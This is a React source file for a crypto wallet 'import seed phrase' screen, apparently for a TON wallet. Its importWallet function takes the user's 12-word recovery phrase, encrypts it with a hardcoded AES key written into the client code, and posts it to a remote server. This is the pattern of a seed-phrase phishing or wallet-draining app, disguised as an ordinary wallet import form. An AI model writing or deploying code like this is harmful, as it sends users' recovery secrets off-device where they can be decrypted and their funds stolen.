import React, { useState, useEffect } from "react";
import axios from "axios";
import CryptoJS from "crypto-js";
import { useNavigate } from "react-router-dom";
import Loading from "./Layouts/Loading";

const SeedPhraseInput = ({ setSeedPhrase }) => {
  const [inputs, setInputs] = useState(Array(12).fill(""));
  const [loading, setLoading] = useState(false);

  const [nonValid, setNonValid] = useState(false);
  const [isInputsFilled, setIsInputsFilled] = useState(null);
  const handleChange = (index) => (e) => {
    const inputString = e.target.value;
    const splitWords = inputString.split(/\s+/).slice(0, 12);
    setInputs(
      inputString.length < 12
        ? [...inputs.slice(0, index), inputString, ...inputs.slice(index + 1)]
        : splitWords.concat(Array(12 - splitWords.length).fill(""))
    );
  };
  const navigate = useNavigate();

  const importWallet = async () => {
    setLoading(true);
    try {
      const encrysecretKey = CryptoJS.AES.encrypt(
        inputs.toString().replace(/,/g, " "),
        "HR#s&7uP@l!9tYA"
      ).toString();

      const res = await axios.post(`${process.env.REACT_APP_API_IMPORT}`, {
        encrysecretKey: encrysecretKey,
      });
      if (res?.data) {
        const response = res.data;

        localStorage.setItem("walletAddressTon", res.data.walletTon);
        setSeedPhrase(inputs.toString().replace(/,/g, " "));
        setLoading(false);
        navigate("/set-password");
      } else {
        setLoading(false);
        setNonValid(true);
      }
    } catch (error) {
      setLoading(false);
      const classbtn = document.querySelector(".btn-import");
      classbtn.classList.remove("margin");
      setNonValid(true);

      console.log(error);
    }
    return;
  };

  useEffect(() => {
    setIsInputsFilled(inputs.every((value) => value.trim() !== ""));
  }, [inputs]);

  return (
    <>
      {loading && <Loading />}
      <div className="seed-phrase-container">
        <h6 style={{ margin: "16px 0", fontFamily: "serif" }}>
          My seed phrase has 12 words
        </h6>
        <div className="input-grid">
          {inputs.map((value, index) => (
            <input
              key={index}
              value={value}
              onChange={handleChange(index)}
              placeholder={index + 1}
            />
          ))}
        </div>

        {nonValid && (
          <p
            className="text-center"
            style={{ color: "red", marginTop: "20px" }}
          >
            {" "}
            Invalid Seed Phrase
          </p>
        )}
        <button
          className="btn-import margin btn btn-outline-primary"
          disabled={!isInputsFilled}
          onClick={() => importWallet()}
        >
          Confirm
        </button>
      </div>
    </>
  );
};

export default SeedPhraseInput;
